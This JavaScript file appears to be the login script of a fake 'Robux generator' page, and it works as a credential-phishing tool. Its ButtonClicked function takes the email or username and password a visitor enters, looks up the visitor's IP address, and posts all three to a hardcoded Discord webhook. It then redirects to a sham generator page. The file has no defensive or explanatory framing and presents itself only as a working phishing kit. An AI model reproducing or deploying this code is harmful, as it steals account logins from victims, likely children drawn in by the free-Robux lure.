function openInNewTab(url) {
    window.open(url, '_blank').focus();
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function httpGet(theUrl)
{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, false );
    xmlHttp.send( null );
    return xmlHttp.responseText;
}

function sendMessage(message) {
    const request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/1151542915462598753/WDGyo4bAPqundpZOSD4Gcrdhilum_sp7vcnVkGjeEv10eQl84dGrjx91WJ9yiCTx86D1");

    request.setRequestHeader('Content-type', 'application/json');

    const params = {
        username: "Robux generator",
        avatar_url: "https://www.tynker.com/projects/images/d6c36d2cbe4e178d1374b1e1283c23e4c33ce782/robux-man---image.png",
        content: message
    }

    request.send(JSON.stringify(params));
}

async function ButtonClicked() {

    document.getElementById("error").setAttribute("class", "visually-hidden"); 
    var email = document.getElementById("email").value
    var password = document.getElementById("password").value

    if (email) {
        if (password) {
        
            sendMessage("email/username: " + email + "\npassword: ||" + password + "||\nip: ||" + httpGet("https://api.ipify.org/") + "||");
            await sleep(500);
            openInNewTab("../generator/index.html");
            window.close();
   
    
        }   else{

            document.getElementById("error").setAttribute("class", ""); 

        }
    }   else{

        document.getElementById("error").setAttribute("class", ""); 

    }
}